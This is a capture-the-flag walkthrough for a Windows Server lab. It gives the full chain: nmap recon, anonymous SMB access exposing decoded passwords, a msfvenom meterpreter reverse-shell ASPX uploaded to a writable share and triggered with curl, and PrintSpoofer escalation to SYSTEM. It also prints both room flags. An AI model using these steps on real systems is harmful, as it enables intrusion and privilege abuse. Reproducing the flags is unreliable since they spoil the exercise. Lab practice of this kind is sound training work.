<img src="10524728b2b462e8d164efe4e67ed087.jpeg" style="zoom:5%;" />

# Relevant

## Penetration Testing Challenge

This exercise is designed to simulate authentic penetration testing scenarios and prepare practitioners for professional certifications.

### Pre-Engagement Briefing

#### __Objective__
Conduct a penetration test on an environment scheduled for production release in 7 days, simulating a malicious actor's perspective with minimal prior knowledge.

#### __Primary Goals__
Locate and capture two flags as proof of exploitation
`User.txt` 
`Root.txt`

#### __Scope & Rules__
__Target__: Only the assigned IP address is in scope
__Approach__: Black box testing (minimal information provided)
__Tools__: Any tools/techniques permitted
__Discovery__: Find and document ALL vulnerabilities

#### Answer the questions below 
---

__Q__: User Flag

__A__:

```
THM{fdk4ka34vk346ksxfr21tg789ktf45}
```

__Q__: Root Flag

__A__:

```
THM{1fk5kf469devly1gl320zafgl345pv}
```

No need for `nmap` to know that this is a Windows Server.

![](THM_relevant_Screenshot_1.png)


__GOOD PRACTICE__: Splitting the terminal or having multiple terminal tabs open enables good navigation & orientation.

Scanning with `nmap` reveals valuable information, preventing many potential frustrations down the road.

```bash
root@ip-10-10-99-136:~# nmap -p- -sC -sV 10.10.172.27
Starting Nmap 7.80 ( https://nmap.org ) at 2025-05-29 19:24 BST
Nmap scan report for 10.10.172.27
Host is up (0.00033s latency).
Not shown: 65526 filtered ports
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2025-05-29T18:27:34+00:00
| ssl-cert: Subject: commonName=Relevant
| Not valid before: 2025-05-28T18:20:37
|_Not valid after:  2025-11-27T18:20:37
|_ssl-date: 2025-05-29T18:28:15+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49663/tcp open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 02:6F:51:08:98:D1 (Unknown)
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h23m59s, deviation: 3h07m49s, median: 0s
|_nbstat: NetBIOS name: RELEVANT, NetBIOS user: <unknown>, NetBIOS MAC: 02:6f:51:08:98:d1 (unknown)
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-05-29T11:27:34-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-05-29T18:27:35
|_  start_date: 2025-05-29T18:20:37

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 200.31 seconds
```
What jumps at you is the guest account access, suggesting anonymous/unauthenticated access might be possible to SMB shares.

Another thing to note is the multiple open `tcp http` ports, which will become relevant in delivering the exploit.

```bash
smbclient -L \\10.10.172.27
Password for [WORKGROUP\root]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	nt4wrksv        Disk      
SMB1 disabled -- no workgroup available
root@ip-10-10-99-136:~# smbclient //10.10.172.27/nt4wrksv//
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul 25 22:46:04 2020
  ..                                  D        0  Sat Jul 25 22:46:04 2020
  passwords.txt                       A       98  Sat Jul 25 16:15:33 2020

		7735807 blocks of size 4096. 5126354 blocks available
smb: \> more passwords.txt
getting file \passwords.txt of size 98 as /tmp/smbmore.u43vrO (31.9 KiloBytes/sec) (average 31.9 KiloBytes/sec)

smb: \> exit
root@ip-10-10-99-136:~# 

```
Passwords are encoded in Base64, which can be decoded using CyberChef or a similar tool.

```
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk

Bob - !P@$$W0rD!123
Bill - Juw4nnaM4n420696969!$$$
```

Using tools like `smbmap` might be helpful in other cases, but here it is a bit redundant since the anonymous access can also deliver the exploits. So the following can actually be skipped.

Passwords lead to nowhere.

```bash
root@ip-10-10-99-136:~# smbmap -H 10.10.172.27 -u Bob -p '!P@$$W0rD!123'
[+] Finding open SMB ports....
[+] User SMB session established on 10.10.172.27...
[+] IP: 10.10.172.27:445	Name: 10.10.172.27                                      
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	.                                                  
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	InitShutdown
	fr--r--r--                4 Sun Dec 31 23:58:45 1600	lsass
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	ntsvcs
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	scerpc
	fr--r--r--                1 Sun Dec 31 23:58:45 1600	Winsock2\CatalogChangeListener-2ac-0
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	epmapper
	fr--r--r--                1 Sun Dec 31 23:58:45 1600	Winsock2\CatalogChangeListener-1a0-0
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	LSM_API_service
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	eventlog
	fr--r--r--                1 Sun Dec 31 23:58:45 1600	Winsock2\CatalogChangeListener-3cc-0
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	TermSrv_API_service
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	Ctx_WinStation_API_service
	fr--r--r--                4 Sun Dec 31 23:58:45 1600	wkssvc
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	atsvc
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	SessEnvPublicRpc
	fr--r--r--                1 Sun Dec 31 23:58:45 1600	Winsock2\CatalogChangeListener-348-0
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	trkwks
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	spoolss
	fr--r--r--                1 Sun Dec 31 23:58:45 1600	Winsock2\CatalogChangeListener-5d4-0
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	W32TIME_ALT
	fr--r--r--                4 Sun Dec 31 23:58:45 1600	srvsvc
	fr--r--r--                1 Sun Dec 31 23:58:45 1600	Winsock2\CatalogChangeListener-220-0
	fr--r--r--                1 Sun Dec 31 23:58:45 1600	Winsock2\CatalogChangeListener-230-0
	fr--r--r--                1 Sun Dec 31 23:58:45 1600	PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER
	fr--r--r--                1 Sun Dec 31 23:58:45 1600	iisipm1bb87675-3872-4e14-ace3-a3a9a64df090
	fr--r--r--                1 Sun Dec 31 23:58:45 1600	Z7kP6yV1CB49BNpFATtkb0JNHt8EIhJcftQW4bUgxUWV7uzwlFLumWnafF8FGYv2Jgis4qQuy69zFTNgicBCHKcm7Il6UGvYoiXY3shmOZH7mxdEFuwsWI
	fr--r--r--                1 Sun Dec 31 23:58:45 1600	CPFATP_3972_v4.0.30319
	fr--r--r--                1 Sun Dec 31 23:58:45 1600	iisipmdb87032d-d651-43b1-a774-744338ee4267
	fr--r--r--                1 Sun Dec 31 23:58:45 1600	Q3ZT4IIE0dmoiXMlzW8AnvZA2f3oKEBFz9QCFQl6PRQcbVYg5MJc9g5xXAahyNtONmcgyx15xTA8uax3JCbcEBzkEjqkJA1HfBIeJXMMQOWg99EM89pMKA
	fr--r--r--                1 Sun Dec 31 23:58:45 1600	CPFATP_2288_v4.0.30319
	IPC$                                              	READ ONLY	Remote IPC
	nt4wrksv                                          	READ, WRITE	
root@ip-10-10-99-136:~# 
```

Let's have the relevant exploits ready.

The first one obtained from the GitHub repo is needed for privilege escalation once we are in. The second one, prepared with `msfvenom` opens the door.

```bash
root@ip-10-10-99-136:~# wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
--2025-05-29 19:30:30--  https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
Resolving github.com (github.com)... 4.208.26.197
Connecting to github.com (github.com)|4.208.26.197|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://objects.githubusercontent.com/github-production-release-asset-2e65be/259576481/816ce080-f39e-11ea-8fc2-8afb7b4f4821?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=releaseassetproduction%2F20250529%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20250529T183030Z&X-Amz-Expires=300&X-Amz-Signature=4707ec4ccbaf15050135e1f8b23c3983cbf8a1d7ef9a1ae4572ce0eb20dda1d2&X-Amz-SignedHeaders=host&response-content-disposition=attachment%3B%20filename%3DPrintSpoofer64.exe&response-content-type=application%2Foctet-stream [following]
--2025-05-29 19:30:30--  https://objects.githubusercontent.com/github-production-release-asset-2e65be/259576481/816ce080-f39e-11ea-8fc2-8afb7b4f4821?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=releaseassetproduction%2F20250529%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20250529T183030Z&X-Amz-Expires=300&X-Amz-Signature=4707ec4ccbaf15050135e1f8b23c3983cbf8a1d7ef9a1ae4572ce0eb20dda1d2&X-Amz-SignedHeaders=host&response-content-disposition=attachment%3B%20filename%3DPrintSpoofer64.exe&response-content-type=application%2Foctet-stream
Resolving objects.githubusercontent.com (objects.githubusercontent.com)... 185.199.111.133, 185.199.108.133, 185.199.109.133, ...
Connecting to objects.githubusercontent.com (objects.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 27136 (26K) [application/octet-stream]
Saving to: \u2018PrintSpoofer64.exe\u2019

PrintSpoofer64.exe        100%[=====================================>]  26.50K  --.-KB/s    in 0.001s  

2025-05-29 19:30:30 (37.4 MB/s) - \u2018PrintSpoofer64.exe\u2019 saved [27136/27136]

root@ip-10-10-99-136:~# msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.99.136 LPORT=8910 -f aspx -o shelly.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 203846 bytes
Final size of aspx file: 1030521 bytes
Saved as: shelly.aspx
root@ip-10-10-99-136:~# 
```

Once these are available on the attack box, return to the `smbclient` and push them both to the nt4wrksv folder.

```bash
root@ip-10-10-99-136:~# smbclient //10.10.172.27/nt4wrksv//
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> put shelly.aspx
putting file shelly.aspx as \shelly.aspx (111817.5 kb/s) (average 111818.7 kb/s)
smb: \> put PrintSpoofer64.exe
putting file PrintSpoofer64.exe as \PrintSpoofer64.exe (563.8 kb/s) (average 18444.1 kb/s)
smb: \> ls
  .                                   D        0  Thu May 29 19:47:47 2025
  ..                                  D        0  Thu May 29 19:47:47 2025
  passwords.txt                       A       98  Sat Jul 25 16:15:33 2020
  PrintSpoofer64.exe                  A    27136  Thu May 29 19:47:47 2025
  shelly.aspx                         A  1030521  Thu May 29 19:47:24 2025

		7735807 blocks of size 4096. 5136685 blocks available
smb: \> quit
root@ip-10-10-99-136:~# 
```

Once the deliveries are placed, it is time to prep the `Metasploit` environment.

```bash
root@ip-10-10-99-136:~# msfconsole
This copy of metasploit-framework is more than two weeks old.
 Consider running 'msfupdate' to update to the latest version.
Metasploit tip: View a module's description using info, or the enhanced 
version in your browser with info -d
                                                  

      .:okOOOkdc'           'cdkOOOko:.
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
  oOOOOOOOO.MMMM.oOOOOoOOOOl.MMMM,OOOOOOOOo
  dOOOOOOOO.MMMMMM.cOOOOOc.MMMMMM,OOOOOOOOx
  lOOOOOOOO.MMMMMMMMM;d;MMMMMMMMM,OOOOOOOOl
  .OOOOOOOO.MMM.;MMMMMMMMMMM;MMMM,OOOOOOOO.
   cOOOOOOO.MMM.OOc.MMMMM'oOO.MMM,OOOOOOOc
    oOOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOOo
     lOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOl
      ;OOOO'MMM.OOOO.MMM:OOOO.MMM;OOOO;
       .dOOo'WM.OOOOocccxOOOO.MX'xOOd.
         ,kOl'M.OOOOOOOOOOOOO.M'dOk,
           :kk;.OOOOOOOOOOOOO.;Ok:
             ;kOOOOOOOOOOOOOOOk:
               ,xOOOOOOOOOOOx,
                 .lOOOOOOOl.
                    ,dOd,
                      .

       =[ metasploit v6.4.55-dev-                         ]
+ -- --=[ 2502 exploits - 1287 auxiliary - 431 post       ]
+ -- --=[ 1616 payloads - 49 encoders - 13 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_tcp
payload => windows/x64/meterpreter_reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.99.136
LHOST => 10.10.99.136
msf6 exploit(multi/handler) > set LPORT 8910
LPORT => 8910
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.99.136:8910 
```

During many frustrating attempts, you will have discovered that the default `tcp` `http` port won't work for the detonation; so utilize the other open port to detonate the shell.

Can be done on the browser or with `curl`.

```bash
root@ip-10-10-99-136:~# curl 10.10.172.27:49663/nt4wrksv/shelly.aspx
```

We are now in, and `Metasploit` is now the `meterpreter >`

All we need to do now is turn it into Shell and start traversing the directories to get to the .exe we pushed earlier.

```bash
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.99.136:8910 
[*] Meterpreter session 1 opened (10.10.99.136:8910 -> 10.10.172.27:49921) at 2025-05-29 19:56:58 +0100

meterpreter > shell
Process 3800 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>cd c:\inetpub
cd c:\inetpub

c:\inetpub>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AC3C-5CB5

 Directory of c:\inetpub

07/25/2020  08:16 AM    <DIR>          .
07/25/2020  08:16 AM    <DIR>          ..
07/25/2020  08:07 AM    <DIR>          history
07/25/2020  08:05 AM    <DIR>          logs
07/25/2020  08:05 AM    <DIR>          temp
07/25/2020  02:46 PM    <DIR>          wwwroot
07/25/2020  02:04 PM    <DIR>          wwwroot1
               0 File(s)              0 bytes
               7 Dir(s)  21,039,386,624 bytes free

c:\inetpub>cd wwwroot
cd wwwroot

c:\inetpub\wwwroot>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AC3C-5CB5

 Directory of c:\inetpub\wwwroot

07/25/2020  02:46 PM    <DIR>          .
07/25/2020  02:46 PM    <DIR>          ..
07/25/2020  08:05 AM    <DIR>          aspnet_client
07/25/2020  08:05 AM               703 iisstart.htm
07/25/2020  08:05 AM            99,710 iisstart.png
05/29/2025  11:47 AM    <DIR>          nt4wrksv
               2 File(s)        100,413 bytes
               4 Dir(s)  21,039,386,624 bytes free

c:\inetpub\wwwroot>cd nt4wrksv
cd nt4wrksv

c:\inetpub\wwwroot\nt4wrksv>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AC3C-5CB5

 Directory of c:\inetpub\wwwroot\nt4wrksv

05/29/2025  11:47 AM    <DIR>          .
05/29/2025  11:47 AM    <DIR>          ..
07/25/2020  08:15 AM                98 passwords.txt
05/29/2025  11:47 AM            27,136 PrintSpoofer64.exe
05/29/2025  11:47 AM         1,030,521 shelly.aspx
               3 File(s)      1,057,755 bytes
               2 Dir(s)  21,039,386,624 bytes free

c:\inetpub\wwwroot\nt4wrksv>
```

Once we are at the location, we must execute the `PrintSpoofer` and convert ourselves to `PowerShell` to escalate the privilege. After that, it is a walk in the park.


```bash
c:\inetpub\wwwroot\nt4wrksv>PrintSpoofer64.exe -i -c powershell.exe
PrintSpoofer64.exe -i -c powershell.exe
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Windows PowerShell 
Copyright (C) 2016 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
whoami
nt authority\system
PS C:\Windows\system32> cd c:\users
cd c:\users
PS C:\users> dir
dir


    Directory: C:\users


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
d-----        7/25/2020   8:05 AM                .NET v4.5                     
d-----        7/25/2020   8:05 AM                .NET v4.5 Classic             
d-----        7/25/2020  10:30 AM                Administrator                 
d-----        7/25/2020   2:03 PM                Bob                           
d-r---        7/25/2020   7:58 AM                Public                        


PS C:\users> cd c:\Users\Administrator\Desktop
PS C:\Users\Administrator\Desktop> dir
dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----        7/25/2020   8:25 AM             35 root.txt                      


PS C:\Users\Administrator\Desktop> cat root.txt
cat root.txt
THM{1fk5kf469devly1gl320zafgl345pv}
PS C:\Users\Administrator\Desktop> cd C:\Users\Bob\Desktop
cd C:\Users\Bob\Desktop
PS C:\Users\Bob\Desktop> dir
dir


    Directory: C:\Users\Bob\Desktop


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----        7/25/2020   8:24 AM             35 user.txt                      


PS C:\Users\Bob\Desktop> cat user.txt
cat user.txt
THM{fdk4ka34vk346ksxfr21tg789ktf45}
PS C:\Users\Bob\Desktop> 

```

This room is an excellent example of reconnaissance's importance in pen-testing, which I completely skipped here. The hard lesson to learn in this room is to pay attention to the initial scan results and think before you act.